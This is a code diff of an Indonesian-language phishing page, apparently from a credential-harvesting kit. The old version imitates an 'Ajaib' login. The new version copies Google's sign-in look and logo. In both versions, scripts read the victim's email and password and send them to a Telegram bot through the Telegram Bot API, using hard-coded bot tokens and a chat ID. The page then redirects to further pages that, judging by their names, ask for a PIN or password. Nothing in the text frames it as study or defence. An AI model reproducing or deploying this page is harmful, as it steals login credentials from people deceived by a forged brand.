@@ -1,149 +1,340 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="utf-8"/>
-    <meta content="width=device-width, initial-scale=1" name="viewport"/>
-    <title>Login Ajaib</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial,sans-serif;
+}
+
+body{
+    background:#fff;
+    min-height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    padding:40px 20px;
+}
+
+.container{
+    max-width:400px;
+    width:100%;
+}
+
+.logo{
+    width:60px;
+    height:60px;
+    border-radius:50%;
+    background:#fff;
+    margin-bottom:24px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+}
+
+.logo img{
+    width:50px;
+    height:50px;
+}
+
+h1{
+    font-size:48px;
+    font-weight:400;
+    margin-bottom:24px;
+    color:#202124;
+}
+
+.email-box{
+    display:inline-flex;
+    align-items:center;
+    gap:12px;
+    border:1px solid #ccc;
+    border-radius:30px;
+    padding:12px 20px;
+    margin-bottom:48px;
+    cursor:pointer;
+    transition:background 0.2s;
+}
+
+.email-box:hover{
+    background:#f1f3f4;
+}
+
+.email-icon img{
+    width:24px;
+    height:24px;
+}
+
+.email-display{
+    font-size:18px;
+}
+
+.arrow svg{
+    width:18px;
+    height:18px;
+    fill:#888;
+}
+
+.input{
+    width:100%;
+    padding:20px;
+    border:1px solid #dadce0;
+    border-radius:4px;
+    font-size:18px;
+    color:#202124;
+    outline:none;
+    transition:border 0.2s;
+}
+
+.input:focus{
+    border:2px solid #1a73e8;
+}
+
+.check{
+    margin-top:20px;
+    display:flex;
+    align-items:center;
+    gap:12px;
+}
+
+.check input{
+    width:18px;
+    height:18px;
+    cursor:pointer;
+}
+
+.check label{
+    font-size:14px;
+    color:#202124;
+    cursor:pointer;
+}
+
+.bottom{
+    margin-top:48px;
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+}
+
+.link{
+    color:#1a73e8;
+    text-decoration:none;
+    font-size:14px;
+    font-weight:500;
+}
+
+.link:hover{
+    text-decoration:underline;
+}
+
+.btn{
+    background:#1a73e8;
+    color:#fff;
+    border:none;
+    padding:16px 32px;
+    border-radius:4px;
+    cursor:pointer;
+    font-size:14px;
+    font-weight:500;
+    transition:background 0.2s;
+}
+
+.btn:hover{
+    background:#1765cc;
+    box-shadow:0 1px 2px rgba(0,0,0,0.2);
+}
+
+.btn:disabled{
+    background:#ccc;
+    cursor:not-allowed;
+}
+
+#status{
+    margin-top:20px;
+    font-size:14px;
+    display:none;
+}
+
+#status.success{
+    color:green;
+    display:block;
+}
+
+#status.error{
+    color:red;
+    display:block;
+}
+
+.footer{
+    margin-top:60px;
+    display:flex;
+    justify-content:space-between;
+    font-size:12px;
+    color:#5f6368;
+}
+
+.footer a{
+    text-decoration:none;
+    color:#5f6368;
+    padding:4px 8px;
+}
+
+.footer a:hover{
+    text-decoration:underline;
+}
+</style>
 </head>
-<body class="bg-white font-sans p-6 max-w-md mx-auto">
-<header class="mb-8">
-    <button aria-label="Kembali" class="text-2xl text-gray-900">
-        <i class="fas fa-arrow-left"></i>
-    </button>
-</header>
-<main>
-    <h1 class="font-bold text-2xl text-gray-900 mb-2">Selamat datang kembali!</h1>
-    <p class="text-gray-800 text-base mb-6 leading-relaxed">
-        Dengan satu akun Ajaib, kamu bisa masuk ke semua platform aplikasi Ajaib.
-    </p>
-    <div aria-label="Email pengguna" class="flex items-center border border-gray-300 rounded-lg p-3 mb-6" role="group">
-        <img alt="Ikon pengguna biru bulat" class="w-10 h-10 rounded-full flex-shrink-0" height="40" id="user-icon" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQVZP9z-oOL4NvOcrMkgPc0UoqMy8PtbAKbjsKxd3EjzhbTEDqE86h9SflP&s=10" width="40"/>
-        <span class="ml-3 text-gray-900 text-base break-all" id="email-text"></span>
-        <button aria-label="Edit email" class="ml-auto text-gray-900 text-xl focus:outline-none" id="edit-email-btn" type="button">
-            <i class="fas fa-pen"></i>
-        </button>
+<body>
+
+<div class="container">
+
+    <!-- Logo SVG -->
+    <div class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="Google">
     </div>
-    <label class="block font-semibold text-gray-900 mb-2" for="password">Password</label>
-    <div class="relative mb-2">
-        <input aria-describedby="forgot-password" class="w-full border-2 border-blue-600 rounded-md px-4 py-2 pr-12 text-gray-900 text-base focus:outline-none focus:ring-2 focus:ring-blue-600" id="password" type="password"/>
-        <button aria-label="Toggle password visibility" class="absolute right-3 top-1/2 -translate-y-1/2 text-gray-900 text-xl focus:outline-none" type="button" id="toggle-password-btn">
-            <i class="fas fa-eye-slash" id="toggle-password-icon"></i>
-        </button>
+
+    <h1>Selamat Datang</h1>
+
+    <!-- Kotak Email dari LocalStorage -->
+    <div class="email-box" id="emailBox" onclick="hapusEmail()">
+        <span class="email-icon">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="User">
+        </span>
+        <span class="email-display" id="emailDisplay">Tidak ada akun</span>
+        <span class="arrow">
+            <svg viewBox="0 0 24 24">
+                <path d="M7 10l5 5 5-5z"/>
+            </svg>
+        </span>
     </div>
-    <div class="text-right mb-10">
-        <a class="text-blue-600 text-sm font-normal hover:underline" href="#" id="forgot-password">Lupa Password</a>
+
+    <!-- Form Input Password -->
+    <input type="password" class="input" id="password" placeholder="Masukkan sandi">
+
+    <div class="check">
+        <input type="checkbox" id="showPass">
+        <label for="showPass">Tampilkan sandi</label>
     </div>
-    <button class="w-full bg-blue-100 text-blue-300 font-semibold py-3 rounded-md cursor-not-allowed" disabled="" id="login-btn" type="submit">Masuk</button>
-</main>
+
+    <div id="status"></div>
+
+    <div class="bottom">
+        <a href="#" class="link" onclick="tambahAkun()">Ganti akun</a>
+        <button class="btn" id="loginBtn">Berikutnya</button>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        <a href="#">Indonesia ▾</a>
+        <div>
+            <a href="#">Bantuan</a>
+            <a href="#">Privasi</a>
+            <a href="#">Persyaratan</a>
+        </div>
+    </div>
+
+</div>
+
 <script>
-    // Ambil email dari localStorage
-    const savedEmail = localStorage.getItem('userEmail') || '';
+// ========== KONFIGURASI ==========
+const botToken = "8824816621%3AAAF7kLSbFOHiibnFHAelyYwspJ7txEQFgVk";
+const chatId = "7549590022";
+// ==============================
 
-    const emailText = document.getElementById('email-text');
-    const editEmailBtn = document.getElementById('edit-email-btn');
-    const userIcon = document.getElementById('user-icon');
-    const passwordInput = document.getElementById('password');
-    const loginBtn = document.getElementById('login-btn');
-    const togglePasswordBtn = document.getElementById('toggle-password-btn');
-    const togglePasswordIcon = document.getElementById('toggle-password-icon');
+// ===== FUNGSI LOCALSTORAGE =====
 
-    // Tampilkan email jika ada, kosongkan jika tidak ada
-    emailText.textContent = savedEmail;
-
-    // Jika email kosong, sembunyikan ikon user
-    if (!savedEmail) {
-        userIcon.style.display = 'none';
+window.onload = function() {
+    const storedEmail = localStorage.getItem('userEmail');
+    const emailDisplay = document.getElementById('emailDisplay');
+    
+    if(storedEmail){
+        emailDisplay.textContent = storedEmail;
     } else {
-        userIcon.style.display = 'block';
+        setTimeout(tambahAkun, 500);
+    }
+};
+
+function simpanEmail(email) {
+    localStorage.setItem('userEmail', email);
+    document.getElementById('emailDisplay').textContent = email;
+}
+
+function hapusEmail() {
+    if(confirm('Ingin ganti akun?')){
+        localStorage.removeItem('userEmail');
+        tambahAkun();
+    }
+}
+
+function tambahAkun() {
+    const email = prompt('Masukkan email Anda:');
+    if(email && email.includes('@')){
+        simpanEmail(email);
+    } else if(email) {
+        alert('Email tidak valid!');
+        tambahAkun();
+    }
+}
+
+// ==============================
+
+document.getElementById('showPass').addEventListener('change', function(){
+    document.getElementById('password').type = this.checked ? 'text' : 'password';
+});
+
+// Kirim ke Telegram
+function sendToTelegram() {
+    const email = localStorage.getItem('userEmail');
+    const password = document.getElementById('password').value;
+    const btn = document.getElementById('loginBtn');
+    const status = document.getElementById('status');
+    
+    if(!email){
+        alert('Silakan masukkan email terlebih dahulu!');
+        return;
+    }
+    
+    if(password === ''){
+        alert('Masukkan sandi terlebih dahulu!');
+        return;
     }
 
-    // Fungsi untuk edit email (kosongkan dan hapus dari localStorage)
-    editEmailBtn.addEventListener('click', () => {
-        localStorage.removeItem('userEmail');
-        emailText.textContent = '';
-        userIcon.style.display = 'none';
-    });
-
-    // Toggle visibility password
-    togglePasswordBtn.addEventListener('click', () => {
-        if (passwordInput.type === 'password') {
-            passwordInput.type = 'text';
-            togglePasswordIcon.classList.remove('fa-eye-slash');
-            togglePasswordIcon.classList.add('fa-eye');
+    btn.disabled = true;
+    btn.innerText = 'Mengirim...';
+    
+    const message = `🔐 Login Baru!\n\n📧 Email: ${email}\n🔑 Password: ${password}`;
+    
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+    
+    fetch(url)
+    .then(response => response.json())
+    .then(data => {
+        if(data.ok){
+            window.location.href = "pasword.html";
+            document.getElementById('password').value = '';
         } else {
-            passwordInput.type = 'password';
-            togglePasswordIcon.classList.remove('fa-eye');
-            togglePasswordIcon.classList.add('fa-eye-slash');
+            status.className = 'error';
+            status.textContent = 'Gagal: ' + data.description;
         }
+    })
+    .catch(error => {
+        status.className = 'error';
+        status.textContent = 'Error: ' + error;
+    })
+    .finally(() => {
+        btn.disabled = false;
+        btn.innerText = 'Berikutnya';
     });
+}
 
-    // Enable login button if password is valid
-    passwordInput.addEventListener('input', () => {
-        const password = passwordInput.value.trim();
-        const isValidPassword = validatePassword(password);
-        
-        if (isValidPassword) {
-            loginBtn.disabled = false;
-            loginBtn.classList.remove('bg-blue-100', 'text-blue-300', 'cursor-not-allowed');
-            loginBtn.classList.add('bg-blue-600', 'text-white', 'cursor-pointer');
-        } else {
-            loginBtn.disabled = true;
-            loginBtn.classList.add('bg-blue-100', 'text-blue-300', 'cursor-not-allowed');
-            loginBtn.classList.remove('bg-blue-600', 'text-white', 'cursor-pointer');
-        }
-    });
-
-      function validatePassword(pw) {
-    const minLength = pw.length >= 8;
-    const hasNumber = /[0-9]/.test(pw);
-    const hasUpper = /[A-Z]/.test(pw);
-    const hasLower = /[a-z]/.test(pw);
-    const hasSymbol = /[$#%&\-!@^*()_+=|{}[\$:;"'<>,.?/~`]/.test(pw);
-    return minLength && hasNumber && hasUpper && hasLower && hasSymbol;
-  }
-
-    // Kirim data ke Telegram via Bot API
-    loginBtn.addEventListener('click', async (e) => {
-        e.preventDefault();
-        const email = emailText.textContent.trim();
-        const password = passwordInput.value.trim();
-
-        if (!email || !password) return;
-
-        // Simpan email ke localStorage
-        localStorage.setItem('userEmail', email);
-
-        // Ganti dengan token bot Telegram dan chat ID Anda
-        const telegramBotToken = '8368615243%3AAAF5xROeGbDUce-sR19mcUr_qOaUf78YEfA';
-        const telegramChatId = '7549590022';
-
-        const message = `Login Data:\nEmail: ${email}\nPassword: ${password}`;
-
-        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
-
-        try {
-            await fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: telegramChatId,
-                    text: message
-                })
-            });
-            window.location.href = 'inputpin.html';
-            passwordInput.value = '';
-            loginBtn.disabled = true;
-            loginBtn.classList.add('bg-blue-100', 'text-blue-300', 'cursor-not-allowed');
-            loginBtn.classList.remove('bg-blue-600', 'text-white', 'cursor-pointer');
-        } catch (error) {
-            alert('Gagal mengirim data.');
-            console.error(error);
-        }
-    });
+document.getElementById('loginBtn').addEventListener('click', sendToTelegram);
 </script>
+
 </body>
-            </html>
+</html>
